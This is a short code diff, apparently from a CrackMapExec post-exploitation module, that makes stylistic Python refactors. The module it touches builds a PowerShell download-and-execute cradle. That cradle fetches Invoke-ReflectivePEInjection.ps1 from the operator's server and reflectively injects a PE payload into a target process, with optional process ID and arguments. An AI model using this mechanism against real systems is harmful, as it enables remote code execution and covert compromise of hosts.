@@ -20,7 +20,7 @@ class CMEModule:
             EXEARGS  Arguments to pass to the executable being reflectively loaded (default: None)
         '''
 
-        if not 'PATH' in module_options:
+        if 'PATH' not in module_options:
             context.log.error('PATH option is required!')
             exit(1)
 
@@ -51,10 +51,10 @@ class CMEModule:
                                                      pefile=os.path.basename(self.payload_path))
 
         if self.procid:
-            payload += ' -ProcessID {}'.format(self.procid)
+            payload += f' -ProcessID {self.procid}'
 
         if self.exeargs:
-            payload += ' -ExeArgs "{}"'.format(self.exeargs)
+            payload += f' -ExeArgs "{self.exeargs}"'
 
         launcher = gen_ps_iex_cradle(context, 'Invoke-ReflectivePEInjection.ps1', payload, post_back=False)
 
@@ -62,7 +62,7 @@ class CMEModule:
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
-        if 'Invoke-ReflectivePEInjection.ps1' == request.path[1:]:
+        if request.path[1:] == 'Invoke-ReflectivePEInjection.ps1':
             request.send_response(200)
             request.end_headers()
 
